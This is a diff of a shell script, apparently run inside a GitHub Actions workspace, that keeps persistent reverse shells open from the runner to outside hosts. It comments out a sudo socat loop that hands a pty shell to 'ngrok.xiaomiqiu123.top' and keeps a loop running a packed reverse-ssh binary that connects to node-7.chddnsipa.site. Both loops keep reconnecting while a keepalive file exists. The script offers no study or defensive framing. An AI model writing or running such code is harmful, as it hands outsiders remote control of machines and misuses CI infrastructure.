@@ -40,18 +40,18 @@ s2="grep -q sftp-server /proc/\$\$/cmdline&&(
 
 
 
-( 
-    (while true; do
-        [ ! -f /tmp/keepalive ] && break
-        sudo $GITHUB_WORKSPACE/socat.bin -t5 exec:"$d1",pty,stderr,setsid,sigint,sane tcp:'ngrok.xiaomiqiu123.top':34292;sleep 8;
-    done) &
-) &
+#( 
+#    (while true; do
+#        [ ! -f /tmp/keepalive ] && break
+#        sudo $GITHUB_WORKSPACE/socat.bin -t5 exec:"$d1",pty,stderr,setsid,sigint,sane tcp:'ngrok.xiaomiqiu123.top':34292;sleep 8;
+#    done) &
+#) &
 
 
 ( 
     (while true; do
         [ ! -f /tmp/keepalive ] && break
-         sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b 50080 -s "$d1" -p  50021  node-7.chddnsipa.site;  sleep 6 ;
+         sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b 50080  -p  50021  node-7.chddnsipa.site;  sleep 6 ;
     done) &
 ) &
  #agent.linux  busybox.bin  ghub.sh  socat.bin  upx_reverse-sshx64.bin
